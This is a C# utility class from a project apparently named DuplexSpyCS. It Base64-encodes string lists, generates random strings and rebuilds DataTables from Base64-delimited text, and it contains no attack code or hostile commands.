using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    internal class clsEZData
    {
        public clsEZData() { }

        const string szChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        public static List<string> fnListEncToB64(List<string> lsInput) => lsInput.Select(x => clsCrypto.b64E2Str(x)).ToList();
        public static List<string> fnListDecFromB64(List<string> lsInput) => lsInput.Select(x => clsCrypto.b64D2Str(x)).ToList();
        public static string fnListStrToStr(List<string> lsInput, string szSplitter = ",") => string.Join(szSplitter, fnListEncToB64(lsInput));
        public static List<string> fnStrToListStr(string szInput, string szSplitter = ",") => fnListDecFromB64(szInput.Split(szSplitter).ToList());

        public static string fnGenerateRandomStr(int nLength = 10)
        {
            StringBuilder result = new StringBuilder(nLength);
            Random random = new Random();

            for (int i = 0; i < nLength; i++)
            {
                result.Append(szChars[random.Next(szChars.Length)]);
            }

            return result.ToString();
        }

        public static DataTable fnStringToDataTable(string szData)
        {
            DataTable dt = new DataTable();

            if (string.IsNullOrEmpty(szData))
                return dt;

            string[] arrParts = szData.Split('|', 2);
            if (arrParts.Length < 2)
                return dt;

            string szColsB64 = arrParts[0];
            string szRowsB64 = arrParts[1];

            string[] arrCols = szColsB64.Split(',');
            foreach (string szColB64 in arrCols)
            {
                string szColName = clsCrypto.b64D2Str(szColB64);
                dt.Columns.Add(szColName);
            }

            if (!string.IsNullOrEmpty(szRowsB64))
            {
                string[] arrRowStrs = szRowsB64.Split(',');

                int nColCount = dt.Columns.Count;
                int nTotalCells = arrRowStrs.Length;
                int nRowCount = nTotalCells / nColCount;

                for (int i = 0; i < nRowCount; i++)
                {
                    DataRow dr = dt.NewRow();
                    for (int j = 0; j < nColCount; j++)
                    {
                        int nIndex = i * nColCount + j;
                        dr[j] = clsCrypto.b64D2Str(arrRowStrs[nIndex]);
                    }
                    dt.Rows.Add(dr);
                }
            }

            return dt;
        }
    }
}
